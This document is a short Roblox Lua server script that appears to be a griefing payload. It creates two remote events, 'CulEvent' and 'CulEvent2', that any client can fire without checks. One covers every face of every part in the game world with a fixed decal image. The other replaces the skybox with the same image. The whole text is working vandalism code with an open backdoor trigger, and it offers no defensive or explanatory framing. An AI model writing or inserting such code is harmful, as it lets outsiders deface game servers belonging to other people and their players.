local ReplicatedStorage=game:GetService("ReplicatedStorage")local remoteEvent = Instance.new("RemoteEvent")remoteEvent.Name = "CulEvent2"remoteEvent.Parent = ReplicatedStorage local ReplicatedStorage = game:GetService("ReplicatedStorage")local remoteEvent = 	Instance.new("RemoteEvent")remoteEvent.Name = "CulEvent"remoteEvent.Parent = ReplicatedStorage game:GetService('ReplicatedStorage'):WaitForChild('CulEvent2').OnServerEvent:Connect(function() for _, v in ipairs(game:GetService('Workspace'):GetDescendants()) do if v:IsA('BasePart') then for _, face in ipairs({Enum.NormalId.Front, Enum.NormalId.Back, Enum.NormalId.Top, Enum.NormalId.Bottom, Enum.NormalId.Left, Enum.NormalId.Right}) do local decal = Instance.new('Decal'); decal.Parent = v; decal.Texture = 'http://www.roblox.com/asset/?id=10560525674'; decal.Face = face end end end end)	game:GetService('ReplicatedStorage'):WaitForChild('CulEvent').OnServerEvent:Connect(function() local sky = Instance.new('Sky', game:GetService('Lighting')); local skyboxID = 'http://www.roblox.com/asset/?id=10560525674'; sky.SkyboxBk, sky.SkyboxDn, sky.SkyboxFt, sky.SkyboxLf, sky.SkyboxRt, sky.SkyboxUp = skyboxID, skyboxID, skyboxID, skyboxID, skyboxID, skyboxID;  end) 
